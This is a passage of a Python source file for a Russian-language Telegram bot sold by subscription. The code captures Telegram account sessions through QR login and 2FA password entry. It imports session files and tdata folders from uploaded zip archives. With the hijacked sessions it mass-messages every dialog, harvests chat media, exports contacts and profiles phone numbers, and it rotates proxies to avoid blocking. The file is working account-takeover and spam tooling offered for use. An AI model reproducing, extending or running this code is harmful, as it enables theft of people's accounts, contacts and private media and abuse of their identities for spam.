            await update.effective_message.reply_text("📌 Использование: /multi <кол-во>\n\nПример: /multi 5")
            return
        try:
            count = min(int(args[0]), MAX_MULTI)
        except ValueError:
            await update.effective_message.reply_text("❌ Введите число")
            return
        await update.effective_message.reply_text(f"🔄 Создание {count} сессий...")
        qr_timeout = get_qr_timeout()
        for i in range(count):
            session_id = f"multi_{user_id}_{i}_{int(time.time())}"
            client = None
            try:
                client = build_client(StringSession(), fast=True)
                await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                qr_login = await asyncio.wait_for(client.qr_login(), timeout=CONNECT_TIMEOUT)
                self.pending_sessions[session_id] = {
                    "user_id": user_id, "client": client, "qr_login": qr_login,
                    "user_proxy": None, "timestamp": time.time(),
                }
                sent_msg = await update.effective_message.reply_text(
                    f"📱 Сессия {i + 1}/{count}\nСсылка: {qr_login.url}\nQR действителен {qr_timeout} сек."
                )
                progress_task = asyncio.create_task(animate_qr_progress(sent_msg, qr_timeout))
                try:
                    await qr_login.wait(timeout=qr_timeout)
                    progress_task.cancel()
                    me = await client.get_me()
                    session_string = StringSession.save(client.session)
                    save_multi_session_file(user_id, i, me.id, session_string)
                    self.multi_clients[f"{user_id}_{i}"] = {"client": client, "user": me.first_name, "id": me.id}
                    await sent_msg.edit_text(f"✅ Сессия {i + 1}: @{me.username} подключена.")
                except asyncio.TimeoutError:
                    progress_task.cancel()
                    if client:
                        try:
                            await client.disconnect()
                        except Exception:
                            pass
                    await sent_msg.edit_text(f"⏱ Сессия {i + 1} истекла.")
            except Exception as e:
                if client:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                await update.effective_message.reply_text(f"❌ Ошибка сессии {i + 1}: {e}")
        await update.effective_message.reply_text(f"✅ Создано {len(self.multi_clients)} сессий")

    async def broadcast_command(self, update, context):
        user_id = update.effective_user.id
        log_action(user_id, "Рассылка")
        args = context.args
        if not args:
            await update.effective_message.reply_text("📌 Использование: /broadcast <текст>\n\nПример: /broadcast Hello")
            return
        message = " ".join(args)
        if user_id not in self.session_files:
            await update.effective_message.reply_text(" Нет активной сессии. Используйте /get_session")
            return
        session_string = self.session_files[user_id]["session_string"]
        client = build_client(StringSession(session_string), fast=False)
        for attempt in range(5):
            try:
                await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                break
            except Exception as e:
                p = get_active_proxy()
                if p:
                    purge_dead_proxy(p)
                rotate_proxy()
                client = build_client(StringSession(session_string), fast=False)
                await asyncio.sleep(1)
                if attempt == 4:
                    await update.effective_message.reply_text(f"❌ Прокси не отвечает: {e}")
                    return
        if not await client.is_user_authorized():
            await update.effective_message.reply_text("❌ Сессия невалидна")
            await client.disconnect()
            return
        try:
            dialogs = await client.get_dialogs(limit=50)
            count = 0
            for dialog in dialogs:
                if dialog.is_user or dialog.is_group or dialog.is_channel:
                    try:
                        await client.send_message(dialog.id, message)
                        count += 1
                        await asyncio.sleep(random.uniform(1, 3))
                    except Exception:
                        continue
            await update.effective_message.reply_text(f"✅ Рассылка завершена. Отправлено {count} сообщений")
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Ошибка: {e}")
        finally:
            await client.disconnect()

    async def harvest_command(self, update, context):
        user_id = update.effective_user.id
        log_action(user_id, "Сбор медиа")
        args = context.args
        if not args:
            await update.effective_message.reply_text("📌 Использование: /harvest <@username или ID> [лимит]\n\nПример: /harvest @durov 100")
            return
        try:
            chat_id = args[0]
            limit = int(args[1]) if len(args) > 1 else 100
        except ValueError:
            await update.effective_message.reply_text("❌ Неверный формат limit")
            return
        if user_id not in self.session_files:
            await update.effective_message.reply_text("❌ Нет активной сессии")
            return
        session_string = self.session_files[user_id]["session_string"]
        client = build_client(StringSession(session_string), fast=False)
        for attempt in range(5):
            try:
                await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                break
            except Exception as e:
                p = get_active_proxy()
                if p:
                    purge_dead_proxy(p)
                rotate_proxy()
                client = build_client(StringSession(session_string), fast=False)
                await asyncio.sleep(1)
                if attempt == 4:
                    await update.effective_message.reply_text(f"❌ Прокси не отвечает: {e}")
                    return
        if not await client.is_user_authorized():
            await update.effective_message.reply_text("❌ Сессия невалидна")
            await client.disconnect()
            return
        try:
            await update.effective_message.reply_text("🔄 Поиск чата и сбор медиа...")
            try:
                entity = await client.get_entity(chat_id)
            except ValueError:
                await update.effective_message.reply_text("❌ Не удалось найти чат. Введите @username.")
                return
            harvester = MediaHarvester()
            media = await harvester.harvest_chat_media(client, entity, limit)
            if media:
                await update.effective_message.reply_text(f"✅ Собрано {len(media)} файлов\n📁 Путь: {harvester.base_dir}")
                zip_path = f"media_{entity.id}_{int(time.time())}.zip"
                with zipfile.ZipFile(zip_path, "w") as zipf:
                    for item in media:
                        if os.path.exists(item["path"]):
                            zipf.write(item["path"], os.path.basename(item["path"]))
                with open(zip_path, "rb") as f:
                    await update.effective_message.reply_document(
                        document=f, filename=f"media_{entity.id}.zip",
                        caption=f" Медиа из чата {entity.id}\nВсего: {len(media)} файлов",
                    )
                os.remove(zip_path)
            else:
                await update.effective_message.reply_text(" Медиа не найдены")
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Ошибка: {e}")
        finally:
            await client.disconnect()

    async def export_command(self, update, context):
        user_id = update.effective_user.id
        log_action(user_id, "Экспорт контактов")
        if user_id not in self.session_files:
            await update.effective_message.reply_text("❌ Нет активной сессии")
            return
        session_string = self.session_files[user_id]["session_string"]
        client = build_client(StringSession(session_string), fast=False)
        for attempt in range(5):
            try:
                await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                break
            except Exception as e:
                p = get_active_proxy()
                if p:
                    purge_dead_proxy(p)
                rotate_proxy()
                client = build_client(StringSession(session_string), fast=False)
                await asyncio.sleep(1)
                if attempt == 4:
                    await update.effective_message.reply_text(f"❌ Прокси не отвечает: {e}")
                    return
        if not await client.is_user_authorized():
            await update.effective_message.reply_text("❌ Сессия невалидна")
            await client.disconnect()
            return
        try:
            await update.effective_message.reply_text("🔄 Экспорт контактов...")
            exporter = ContactExporter()
            result = await exporter.export_contacts(client)
            if result["total"] > 0:
                await update.effective_message.reply_text(
                    f"✅ Экспортировано {result['total']} контактов\n📁 JSON: {result['json']}\n📁 CSV: {result['csv']}"
                )
                with open(result["csv"], "rb") as f:
                    await update.effective_message.reply_document(
                        document=f, filename=f"contacts_{int(time.time())}.csv",
                        caption=f"📇 Контакты: {result['total']}",
                    )
            else:
                await update.effective_message.reply_text("❌ Контакты не найдены")
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Ошибка: {e}")
        finally:
            await client.disconnect()

    async def profile_command(self, update, context):
        user_id = update.effective_user.id
        log_action(user_id, "Профилирование номера (Free)")
        args = context.args
        if not args:
            await update.effective_message.reply_text("📌 Использование: /profile <phone>\n\nПример: /profile +79123456789")
            return
        phone = args[0]
        try:
            profiler = GeoProfiler()
            result = profiler.profile_phone(phone)
            if result.get("valid"):
                await update.effective_message.reply_text(
                    f"📊 Профиль номера {phone}:\n\n"
                    f"🌍 Страна: {result.get('country', 'N/A')}\n"
                    f"🏙 Город: {result.get('city', 'N/A')}\n"
                    f"📡 Оператор: {result.get('carrier', 'N/A')}\n"
                    f"🕐 Часовой пояс: {result.get('timezone', 'N/A')}\n"
                    f"📱 Тип: {result.get('number_type', 'N/A')}\n"
                    f"✅ Валидный: {result.get('valid')}"
                )
            else:
                await update.effective_message.reply_text(f" Невалидный номер: {phone}")
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Ошибка: {e}")

    async def handle_text(self, update, context):
        user = update.effective_user
        register_user(user.id, user.username, user.first_name)
        user_id = user.id
        text = update.effective_message.text
        chat_id = update.effective_chat.id

        if context.user_data.get('waiting_for_proxy'):
            context.user_data['waiting_for_proxy'] = False
            raw = text.strip()
            label = ""
            if "|" in raw:
                raw, _, label = raw.partition("|")
                label = label.strip()
            proxy = parse_user_proxy_input(raw.strip())
            if not proxy:
                await update.effective_message.reply_text(
                    "❌ Не распознал прокси. Форматы:\n"
                    "<code>tg://proxy?server=HOST&port=PORT&secret=SECRET</code>\n"
                    "<code>https://t.me/proxy?server=HOST&port=PORT&secret=SECRET</code>\n"
                    "<code>HOST:PORT:SECRET</code>\n"
                    "<code>socks5://user:pass@host:port</code>\n"
                    "<code>host:port</code>",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 К прокси", callback_data="my_proxies")]])
                )
                return
            existing = list_user_proxies(user_id)
            new_key = _user_proxy_key(proxy)
            for e in existing:
                if _user_proxy_key(e) == new_key:
                    await update.effective_message.reply_text("⚠️ Такой прокси уже добавлен.", reply_markup=get_proxy_menu(user_id))
                    return
            pid = add_user_proxy(user_id, proxy, label)
            if pid == -1:
                await update.effective_message.reply_text(f"❌ Лимит {MAX_USER_PROXIES} прокси.", reply_markup=get_proxy_menu(user_id))
                return
            log_action(user_id, f"Добавил прокси {proxy['type']}://{proxy['server']}:{proxy['port']}")
            text_out = (
                f"✅ Прокси добавлен!\n\n"
                f"• <code>{proxy['type']}://{proxy['server']}:{proxy['port']}</code>\n"
                f"• Метка: {label or '-'}\n\n"
                f"Теперь можно генерировать QR через него: «Получить сессию» → «🔌 Через мой прокси»."
            )
            await update.effective_message.reply_text(text_out, parse_mode="HTML", reply_markup=get_proxy_menu(user_id))
            return

        if self.is_admin(update) and context.user_data.get('admin_waiting_for_broadcast_text'):
            broadcast_msg = text.strip()
            context.user_data['admin_waiting_for_broadcast_text'] = False
            await update.effective_message.reply_text("🔄 Начинаю рассылку...")
            client = None
            try:
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT user_id, joined_at FROM users")
                rows = c.fetchall()
                conn.close()
                now = datetime.now()
                user_ids = []
                for r in rows:
                    try:
                        if (now - datetime.fromisoformat(r[1])).total_seconds() <= 86400:
                            user_ids.append(r[0])
                    except Exception:
                        pass
                if not user_ids:
                    await update.effective_message.reply_text("❌ Нет новых пользователей за последние 24 часа.", reply_markup=get_admin_menu())
                    return
                session_string = self.session_files[ADMIN_ID]["session_string"]
                client = build_client(StringSession(session_string), fast=False)
                for attempt in range(5):
                    try:
                        await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                        break
                    except Exception:
                        p = get_active_proxy()
                        if p:
                            purge_dead_proxy(p)
                        rotate_proxy()
                        client = build_client(StringSession(session_string), fast=False)
                        await asyncio.sleep(1)
                if not await client.is_user_authorized():
                    await update.effective_message.reply_text("❌ Сессия админа невалидна.")
                    return
                sent_count = 0
                for uid in user_ids:
                    try:
                        await client.send_message(uid, broadcast_msg)
                        sent_count += 1
                        await asyncio.sleep(random.uniform(1, 2))
                    except Exception:
                        continue
                await update.effective_message.reply_text(f"✅ Рассылка завершена. Отправлено: {sent_count} из {len(user_ids)}.", reply_markup=get_admin_menu())
            except Exception as e:
                await update.effective_message.reply_text(f"❌ Ошибка рассылки: {e}", reply_markup=get_admin_menu())
            finally:
                if client:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
            return

        if self.is_admin(update) and context.user_data.get('admin_waiting_for_qr_timeout'):
            val = text.strip()
            if not val.isdigit():
                await update.effective_message.reply_text("❌ Срок должен быть числом (в секундах).")
                return
            new_timeout = int(val)
            if new_timeout < 30:
                await update.effective_message.reply_text("❌ Минимальный срок — 30 секунд.")
                return
            set_setting("qr_timeout", new_timeout)
            context.user_data['admin_waiting_for_qr_timeout'] = False
            log_action(user_id, f"Изменил срок QR по умолчанию на {new_timeout} сек")
            await update.effective_message.reply_text(
                f"✅ Срок QR-кода по умолчанию успешно изменен на <b>{new_timeout}</b> секунд.",
                parse_mode="HTML", reply_markup=get_settings_menu()
            )
            return

        if self.is_admin(update) and context.user_data.get('admin_waiting_for_id'):
            target_id_str = text.strip()
            if not target_id_str.isdigit():
                await update.effective_message.reply_text("❌ ID должен состоять только из цифр. Попробуйте снова или нажмите /start.")
                return
            target_id = int(target_id_str)
            context.user_data['admin_waiting_for_id'] = False
            keyboard = [
                [InlineKeyboardButton("3 дня", callback_data=f"grant_sub_{target_id}_3"),
                 InlineKeyboardButton("6 дней", callback_data=f"grant_sub_{target_id}_6")],
                [InlineKeyboardButton("9 дней", callback_data=f"grant_sub_{target_id}_9"),
                 InlineKeyboardButton("13 дней", callback_data=f"grant_sub_{target_id}_13")],
                [InlineKeyboardButton("🔙 Отмена", callback_data="admin_panel")]
            ]
            await update.effective_message.reply_text(
                f"Выберите срок подписки для пользователя <code>{target_id}</code>:",
                parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        if text.startswith("/"):
            cmd = text.split()[0].lower()
            if cmd in ("/grant", "/revoke"):
                if cmd == "/grant":
                    await self.grant_command(update, context)
                else:
                    await self.revoke_command(update, context)
                return
            if cmd == "/profile":
                context.args = text.split()[1:]
                await self.profile_command(update, context)
                return
            if cmd == "/proxy":
                if not has_sub(user_id) and not self.is_admin(update):
                    await update.effective_message.reply_text(f"❌ Требуется подписка. Купите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
                    return
                proxies = list_user_proxies(user_id)
                msg = "🔌 <b>Мои прокси</b>\n\n"
                if proxies:
                    for p in proxies:
                        label = p.get("label") or "-"
                        msg += f"• <code>{p['type']}://{p['server']}:{p['port']}</code> — {label}\n"
                    msg += f"\nВсего: {len(proxies)}/{MAX_USER_PROXIES}"
                else:
                    msg += "Список пуст."
                await update.effective_message.reply_text(msg, parse_mode="HTML", reply_markup=get_proxy_menu(user_id))
                return
            if cmd in ("/multi", "/broadcast", "/harvest", "/export"):
                if not has_paid_sub(user_id) and not self.is_admin(user_id):
                    await update.effective_message.reply_text(f"🔒 <b>Функция доступна только с полной подпиской.</b>\n\nКупите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
                    return
                context.args = text.split()[1:]
                if cmd == "/multi":
                    await self.multi_account_command(update, context)
                elif cmd == "/broadcast":
                    await self.broadcast_command(update, context)
                elif cmd == "/harvest":
                    await self.harvest_command(update, context)
                elif cmd == "/export":
                    await self.export_command(update, context)
                return
            if cmd == "/cancel":
                await self.cancel_command(update, context)
                return
            if cmd == "/start":
                await self.start_command(update, context)
                return

        if user_id in self.waiting_for_2fa:
            session_id = self.waiting_for_2fa[user_id]
            session = self.pending_sessions.get(session_id)
            if not session:
                await context.bot.send_message(chat_id, "❌ Сессия не найдена.")
                del self.waiting_for_2fa[user_id]
                return
            client = session["client"]
            for attempt in range(3):
                try:
                    await asyncio.wait_for(client.sign_in(password=text.strip()), timeout=CONNECT_TIMEOUT)
                    me = await client.get_me()
                    session_string = StringSession.save(client.session)
                    self.session_files[user_id] = {
                        "session_string": session_string,
                        "user_info": {"id": me.id, "username": me.username, "first_name": me.first_name, "phone": me.phone},
                        "timestamp": datetime.now().isoformat(),
                    }
                    session_file = save_session_file(user_id, me.id, session_string)
                    await context.bot.send_message(
                        chat_id,
                        f"✅ 2FA пройдена! Сессия сохранена!\n\n"
                        f"👤 Пользователь: {me.first_name}\n"
                        f"🆔 ID: {me.id}\n"
                        f"📱 Username: @{me.username}\n"
                        f"📞 Телефон: {me.phone}"
                    )
                    with open(session_file, "rb") as f:
                        await context.bot.send_document(
                            chat_id=chat_id, document=f, filename=f"session_{me.id}.session",
                            caption=f"✅ Сессия для @{me.username} сохранена",
                        )
                    self.pending_sessions.pop(session_id, None)
                    del self.waiting_for_2fa[user_id]
                    return
                except errors.PasswordHashInvalidError:
                    await context.bot.send_message(chat_id, "❌ Неверный пароль 2FA. /cancel для отмены.")
                    return
                except Exception as e:
                    p = get_active_proxy()
                    if p:
                        purge_dead_proxy(p)
                    rotate_proxy()
                    if attempt == 2:
                        await context.bot.send_message(chat_id, f"❌ Ошибка 2FA: {e}")
                        return
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    client = build_client(StringSession(), fast=True, user_proxy=session.get("user_proxy"))
                    session["client"] = client
                    try:
                        await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                    except Exception:
                        pass
            return

        if text.startswith("session:"):
            if not has_paid_sub(user_id) and not self.is_admin(user_id):
                await update.effective_message.reply_text(f" <b>Функция доступна только с полной подпиской.</b>\n\nКупите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
                return
            session_string = text.replace("session:", "").strip()
            client = None
            for attempt in range(5):
                try:
                    client = build_client(StringSession(session_string), fast=False)
                    await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                    if await client.is_user_authorized():
                        me = await client.get_me()
                        self.session_files[user_id] = {
                            "session_string": session_string,
                            "user_info": {"id": me.id, "username": me.username, "first_name": me.first_name, "phone": me.phone},
                            "timestamp": datetime.now().isoformat(),
                        }
                        session_file = save_session_file(user_id, me.id, session_string)
                        await update.effective_message.reply_text(
                            f"✅ Сессия импортирована!\n\n"
                            f"👤 Пользователь: {me.first_name}\n"
                            f"🆔 ID: {me.id}\n"
                            f" Username: @{me.username}\n"
                            f"📞 Телефон: {me.phone}\n\n"
                            f"📁 Файл сохранен: {session_file}"
                        )
                    else:
                        await update.effective_message.reply_text("❌ Недействительная сессия")
                    await client.disconnect()
                    break
                except Exception as e:
                    if client:
                        try:
                            await client.disconnect()
                        except Exception:
                            pass
                    p = get_active_proxy()
                    if p:
                        purge_dead_proxy(p)
                    rotate_proxy()
                    await asyncio.sleep(1)
                    if attempt == 4:
                        await update.effective_message.reply_text(f"❌ Ошибка импорта: {e}")

    async def handle_document(self, update, context):
        user = update.effective_user
        register_user(user.id, user.username, user.first_name)
        user_id = user.id
        document = update.effective_message.document
        if not (document.file_name and document.file_name.endswith(".zip")):
            return
        if not has_paid_sub(user_id) and not self.is_admin(user_id):
            await update.effective_message.reply_text(f"🔒 <b>Функция доступна только с полной подпиской.</b>\n\nКупите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
            return
        try:
            await update.effective_message.reply_text("🔄 Обработка ZIP архива...")
            file = await context.bot.get_file(document.file_id)
            zip_path = f"temp_{user_id}_{int(time.time())}.zip"
            await file.download_to_drive(zip_path)
            extract_path = f"extracted_{user_id}_{int(time.time())}"
            os.makedirs(extract_path, exist_ok=True)
            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(extract_path)
            tdata_path = None
            for root, dirs, files in os.walk(extract_path):
                if "tdata" in dirs or any(f.endswith(".session") for f in files):
                    tdata_path = root
                    break
            if not tdata_path:
                await update.effective_message.reply_text("❌ Папка tdata не найдена в архиве")
                shutil.rmtree(extract_path, ignore_errors=True)
                os.remove(zip_path)
                return
            session_files = [f for f in os.listdir(tdata_path) if f.endswith(".session")]
            if not session_files:
                await update.effective_message.reply_text("❌ Файл .session не найден в архиве")
                shutil.rmtree(extract_path, ignore_errors=True)
                os.remove(zip_path)
                return
            session_path = os.path.join(tdata_path, session_files[0])
            for attempt in range(5):
                try:
                    client = build_client(session_path, fast=False)
                    await asyncio.wait_for(client.connect(), timeout=CONNECT_TIMEOUT)
                    if await client.is_user_authorized():
                        me = await client.get_me()
                        session_string = StringSession.save(client.session)
                        self.session_files[user_id] = {
                            "session_string": session_string,
                            "user_info": {"id": me.id, "username": me.username, "first_name": me.first_name, "phone": me.phone},
                            "timestamp": datetime.now().isoformat(),
                        }
                        session_file = save_session_file(user_id, me.id, session_string)
                        await update.effective_message.reply_text(
                            f"✅ ZIP архив обработан!\n\n"
                            f"👤 Пользователь: {me.first_name}\n"
                            f" ID: {me.id}\n"
                            f"📱 Username: @{me.username}\n"
                            f"📞 Телефон: {me.phone}\n\n"
                            f"📁 Сессия сохранена: {session_file}"
                        )
                    else:
                        await update.effective_message.reply_text("❌ Сессия в архиве невалидна")
                    await client.disconnect()
                    break
                except Exception as e:
                    p = get_active_proxy()
                    if p:
                        purge_dead_proxy(p)
                    rotate_proxy()
                    await asyncio.sleep(1)
                    if attempt == 4:
                        await update.effective_message.reply_text(f"❌ Ошибка обработки архива: {e}")
            shutil.rmtree(extract_path, ignore_errors=True)
            os.remove(zip_path)
        except Exception as e:
            await update.effective_message.reply_text(f"❌ Ошибка обработки архива: {e}")

    async def status_command(self, update, context):
        user_id = update.effective_user.id
        if user_id in self.session_files:
            session_data = self.session_files[user_id]
            info = session_data["user_info"]
            await update.effective_message.reply_text(
                f"📊 Статус сессии:\n\n"
                f" Пользователь: {info.get('first_name', 'Unknown')}\n"
                f" ID: {info.get('id', 'N/A')}\n"
                f"📱 Username: @{info.get('username', 'N/A')}\n"
                f"📞 Телефон: {info.get('phone', 'N/A')}\n"
                f"⏱ Получена: {session_data.get('timestamp', 'N/A')}\n"
                f"📟 Устройств: {session_data.get('devices', 'N/A')}\n"
                f"👥 Мульти-аккаунтов: {len(self.multi_clients)}"
            )
        else:
            await update.effective_message.reply_text("❌ Нет активных сессий. Используйте /get_session")

    async def clear_command(self, update, context):
        user_id = update.effective_user.id
        log_action(user_id, "Очистка сессий")
        self.session_files.pop(user_id, None)
        for key in [k for k in self.multi_clients if k.startswith(str(user_id))]:
            try:
                await self.multi_clients[key]["client"].disconnect()
            except Exception:
                pass
            self.multi_clients.pop(key, None)
        await update.effective_message.reply_text("✅ Все сессии очищены")

async def proxy_rotator_loop():
    while True:
        await asyncio.sleep(600)
        try:
            await load_or_refresh_proxies(force=True)
        except Exception:
            pass

async def watchdog_loop(app):
    failures = 0
    while True:
        await asyncio.sleep(WATCHDOG_INTERVAL)
        try:
            await asyncio.wait_for(app.bot.get_me(), timeout=30.0)
            failures = 0
        except Exception:
            failures += 1
            p = get_ptb_proxy()
            if p:
                purge_dead_proxy(p)
            rotate_ptb_proxy()
            if failures >= 3:
                try:
                    await load_or_refresh_proxies(force=True)
                except Exception:
                    pass
                try:
                    if app.updater and app.updater.running:
                        await app.updater.stop()
                        await asyncio.sleep(2)
                        await app.updater.start_polling(drop_pending_updates=True)
                except Exception:
                    pass
                failures = 0

def ensure_sessions_dir():
    os.makedirs(SESSIONS_DIR, exist_ok=True)

def save_session_file(user_id: int, tg_id: int, session_string: str) -> str:
    ensure_sessions_dir()
    path = os.path.join(SESSIONS_DIR, f"session_{user_id}_{tg_id}.session")
    with open(path, "w", encoding="utf-8") as f:
        f.write(session_string)
    return path

def save_multi_session_file(user_id: int, index: int, tg_id: int, session_string: str) -> str:
    ensure_sessions_dir()
    path = os.path.join(SESSIONS_DIR, f"multi_{user_id}{index}{tg_id}.session")
    with open(path, "w", encoding="utf-8") as f:
        f.write(session_string)
    return path

def _ensure_socksio():
    global HAS_SOCKSIO
    if HAS_SOCKSIO:
        return
    _log("socksio не найден, пробую установить...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "socksio"],
                       capture_output=True, timeout=60)
        import importlib
        importlib.invalidate_caches()
        import socksio  # noqa
        HAS_SOCKSIO = True
        _log("socksio установлен")
    except Exception as e:
        _log(f"socksio не установился: {e}")

async def main():
    _log("Старт бота...")
    _ensure_socksio()
    BackgroundEngine.setup()
    sleep_blocker = WinSleepBlocker()
    sleep_blocker.block()
    controller = TelegramBotController(BOT_TOKEN)
    app = await controller.start_bot()
    if not app:
        _log("❌ Не удалось запустить бота — 8 попыток провалились. Проверь сеть/прокси/токен.")
        sleep_blocker.unblock()
        sys.exit(1)
    _log("Бот работает. Ctrl+C для выхода.")
    try:
        await asyncio.Event().wait()
    except asyncio.CancelledError:
        pass
    finally:
        sleep_blocker.unblock()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        _log("Получен Ctrl+C, выход.")
        sys.exit(0)
    except Exception as e:
        _log(f"❌ Фатальная ошибка: {e}")
        traceback.print_exc()
        sys.exit(1)